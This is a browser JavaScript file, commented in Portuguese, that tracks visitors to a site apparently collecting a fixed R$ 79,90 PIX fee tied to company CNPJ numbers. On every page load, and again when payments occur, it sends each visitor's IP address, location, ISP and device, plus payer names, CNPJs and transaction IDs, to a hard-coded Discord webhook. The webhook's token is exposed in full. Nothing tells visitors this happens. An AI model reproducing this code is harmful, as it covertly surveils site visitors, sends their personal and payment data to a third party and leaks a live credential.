/* ============================================
   DISCORD TRACKER — Notificações automáticas
   ============================================ */

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1572521664103579788/22BBHV0ml-Rz3wHLFMK3eP5i5Ol48qP0cqnq8_IhtLrRSgHbk0hsGfMyNPaQI9I22fHd';

// ── Obter informações de localização via IP ──
async function obterLocalizacao() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return {
      ip: data.ip || 'Desconhecido',
      cidade: data.city || 'Desconhecido',
      estado: data.region || 'Desconhecido',
      pais: data.country_name || 'Desconhecido',
      isp: data.org || 'Desconhecido'
    };
  } catch (err) {
    console.error('[discord] Erro ao obter localização:', err);
    return {
      ip: 'Desconhecido',
      cidade: 'Desconhecido',
      estado: 'Desconhecido',
      pais: 'Desconhecido',
      isp: 'Desconhecido'
    };
  }
}

// ── Extrair informações do dispositivo ──
function obterDispositivo() {
  const ua = navigator.userAgent;
  
  // Detectar sistema operacional
  let os = 'Desconhecido';
  if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
  else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
  else if (ua.includes('Linux')) os = 'Linux';

  // Detectar navegador
  let browser = 'Desconhecido';
  if (ua.includes('Edg/')) browser = 'Edge';
  else if (ua.includes('Chrome/') && !ua.includes('Edg/')) browser = 'Chrome';
  else if (ua.includes('Firefox/')) browser = 'Firefox';
  else if (ua.includes('Safari/') && !ua.includes('Chrome/')) browser = 'Safari';
  else if (ua.includes('Opera/') || ua.includes('OPR/')) browser = 'Opera';

  // Detectar tipo de dispositivo
  let tipo = 'Desktop';
  if (ua.includes('Mobile')) tipo = 'Mobile';
  else if (ua.includes('Tablet')) tipo = 'Tablet';

  return `${tipo} - ${os} - ${browser}`;
}

// ── Criar embed do Discord ──
function criarEmbed(tipo, dados, localizacao, dispositivo) {
  const cores = {
    acesso: 3447003,      // Azul
    pix_gerado: 15844367, // Laranja
    pagamento: 5763719    // Verde
  };

  const emojis = {
    acesso: '👁️',
    pix_gerado: '💳',
    pagamento: '✅'
  };

  const titulos = {
    acesso: 'Novo Acesso ao Site',
    pix_gerado: 'PIX Gerado',
    pagamento: 'Pagamento Confirmado'
  };

  const embed = {
    title: `${emojis[tipo]} ${titulos[tipo]}`,
    color: cores[tipo],
    timestamp: new Date().toISOString(),
    fields: []
  };

  // Campos específicos por tipo
  if (tipo === 'acesso') {
    embed.fields.push({
      name: '📄 Página',
      value: dados.pagina || 'index.html',
      inline: true
    });
  }

  if (tipo === 'pix_gerado' || tipo === 'pagamento') {
    embed.fields.push(
      {
        name: '🏢 CNPJ',
        value: dados.cnpj || 'Não informado',
        inline: true
      },
      {
        name: '💰 Valor',
        value: dados.valor || 'R$ 79,90',
        inline: true
      }
    );
  }

  if (tipo === 'pix_gerado') {
    embed.fields.push({
      name: '🔖 Protocolo',
      value: dados.protocolo || 'N/A',
      inline: true
    });
  }

  if (tipo === 'pagamento') {
    embed.fields.push(
      {
        name: '🔖 ID Transação',
        value: dados.transacaoId || 'N/A',
        inline: true
      },
      {
        name: '👤 Pagador',
        value: dados.pagadorNome || 'Não informado',
        inline: true
      },
      {
        name: '📅 Pago em',
        value: dados.pagoEm ? new Date(dados.pagoEm).toLocaleString('pt-BR') : new Date().toLocaleString('pt-BR'),
        inline: true
      }
    );
  }

  // Informações de localização
  embed.fields.push(
    {
      name: '🌍 Localização',
      value: `${localizacao.cidade}, ${localizacao.estado}\n${localizacao.pais}`,
      inline: true
    },
    {
      name: '📡 IP',
      value: localizacao.ip,
      inline: true
    },
    {
      name: '🌐 ISP',
      value: localizacao.isp,
      inline: true
    },
    {
      name: '💻 Dispositivo',
      value: dispositivo,
      inline: false
    }
  );

  return embed;
}

// ── Função para enviar notificação ao Discord ──
async function notificarDiscord(tipo, dados) {
  try {
    console.log('[discord] Enviando notificação:', tipo, dados);
    
    // Obter informações
    const localizacao = await obterLocalizacao();
    const dispositivo = obterDispositivo();
    
    // Criar embed
    const embed = criarEmbed(tipo, dados, localizacao, dispositivo);
    
    // Enviar para Discord
    const response = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    
    if (!response.ok) {
      console.error('[discord] Erro na resposta:', response.status);
    } else {
      console.log('[discord] ✅ Notificação enviada com sucesso!');
    }
  } catch (err) {
    console.error('[discord] ❌ Erro ao notificar:', err);
  }
}

// ── Rastrear acesso à página ──
function rastrearAcesso() {
  var pagina = window.location.pathname.split('/').pop() || 'index.html';
  notificarDiscord('acesso', { pagina: pagina });
}

// ── Rastrear geração de PIX ──
function rastrearPixGerado(cnpj, protocolo, valor) {
  notificarDiscord('pix_gerado', {
    cnpj: cnpj,
    protocolo: protocolo,
    valor: valor || 'R$ 79,90'
  });
}

// ── Rastrear pagamento confirmado ──
function rastrearPagamento(transacaoId, cnpj, pagadorNome, pagoEm) {
  notificarDiscord('pagamento', {
    transacaoId: transacaoId,
    cnpj: cnpj,
    pagadorNome: pagadorNome,
    pagoEm: pagoEm,
    valor: 'R$ 79,90'
  });
}

// ── Auto-rastrear acesso em todas as páginas ──
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', rastrearAcesso);
} else {
  rastrearAcesso();
}

// Exportar para uso global
window.rastrearPixGerado = rastrearPixGerado;
window.rastrearPagamento = rastrearPagamento;
